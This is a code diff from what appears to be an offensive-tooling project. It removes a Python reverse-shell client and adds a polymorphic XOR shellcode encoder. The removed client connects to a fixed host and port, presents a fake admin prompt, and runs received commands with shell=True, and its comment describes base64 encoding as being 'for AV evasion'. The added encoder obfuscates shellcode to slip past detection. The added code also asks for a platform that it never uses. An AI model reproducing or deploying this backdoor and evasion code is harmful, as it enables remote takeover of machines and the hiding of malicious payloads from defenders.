@@ -1,57 +1,70 @@
-import socket
-import subprocess
-import os
-import base64
-import time
+import random
+import sys
 
-# Client configurations
-SERVER_HOST = '10.0.1.33'
-SERVER_PORT = 9999
+# XOR encoding function with polymorphism (feedback mechanism)
+def xor_encode(shellcode, key):
+    encoded_shellcode = bytearray()
+    feedback_key = key
+    for byte in shellcode:
+        encoded_byte = byte ^ feedback_key
+        encoded_shellcode.append(encoded_byte)
+        # Add feedback to modify the XOR key after each byte is encoded
+        feedback_key = (feedback_key + encoded_byte) & 0xFF  # Ensure key stays within byte range (0-255)
+    return encoded_shellcode
 
-# Function to encode the shell payload (for AV evasion)
-def encode_shell(command):
-    return base64.b64encode(command.encode()).decode()
+# Function to get shellcode as input (binary data)
+def get_shellcode_input():
+    print("Enter the path to your shellcode binary file:")
+    file_path = input("> ").strip()
+    
+    try:
+        with open(file_path, 'rb') as f:
+            shellcode = f.read()
+        print(f"Successfully loaded shellcode from {file_path}")
+        return shellcode
+    except Exception as e:
+        print(f"Error reading shellcode from file: {e}")
+        sys.exit(1)
 
-# Connect to the server
-def connect_to_server():
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((SERVER_HOST, SERVER_PORT))
-    return client_socket
+# Function to generate polymorphic XOR encoded shellcode
+def generate_shellcode(shellcode, key=0xAA):
+    print("Encoding the shellcode...")
+    encoded_shellcode = xor_encode(shellcode, key)
+    return encoded_shellcode
 
-# Handle incoming commands from the server
-def handle_commands(client_socket):
-    while True:
-        try:
-            # Receive command from server
-            client_socket.send(b"admin@medusax~$ ")
-            command = client_socket.recv(1024).decode().strip()
-            if command == "exit":
-                break
+# Function to prompt the user for the file name and save the shellcode
+def save_shellcode(encoded_shellcode):
+    print("Enter the filename to save the encoded shellcode (e.g., encoded_shellcode.bin):")
+    file_name = input("> ").strip()
+    
+    try:
+        with open(file_name, 'wb') as f:
+            f.write(encoded_shellcode)
+        print(f"Encoded shellcode saved as {file_name}")
+    except Exception as e:
+        print(f"Error saving file: {e}")
+        sys.exit(1)
 
-            if command.startswith("shell -d"):
-                directory = command.split(" ")[-1] if len(command.split()) > 1 else "C:\\"
-                os.chdir(directory)
-                client_socket.send(f"Shell started in {os.getcwd()}...\n".encode())
-                while True:
-                    # Accept shell commands
-                    shell_command = client_socket.recv(1024).decode()
-                    if shell_command == "exit":
-                        break
-                    result = subprocess.run(shell_command, shell=True, capture_output=True)
-                    client_socket.send(result.stdout + result.stderr)
-            else:
-                # Encode and send the command if it's non-shell
-                encoded_command = encode_shell(command)
-                client_socket.send(f"Executing encoded command: {encoded_command}\n".encode())
-                time.sleep(0.1)
-        except Exception as e:
-            print(f"Error in client: {e}")
-            break
+# Main function to execute the encoding process
+def main():
+    # Step 1: Get the shellcode from user input
+    shellcode = get_shellcode_input()
+    
+    # Step 2: Ask for the platform (Windows or Linux)
+    platform = input("Choose platform (windows/linux): ").strip().lower()
+    if platform not in ['windows', 'linux']:
+        print("Invalid platform. Exiting...")
+        sys.exit(1)
+    
+    # Step 3: Choose a random key for XOR encoding (you can also specify your own key)
+    key = random.randint(0, 255)  # Random key for XOR encoding
+    
+    # Step 4: Generate the polymorphic XOR encoded shellcode
+    encoded_shellcode = generate_shellcode(shellcode, key)
+    
+    # Step 5: Save the encoded shellcode to a file
+    save_shellcode(encoded_shellcode)
 
-    # Clean up connection
-    client_socket.close()
-
-# Main client function
+# Run the main function
 if __name__ == "__main__":
-    client_socket = connect_to_server()
-    handle_commands(client_socket)
+    main()
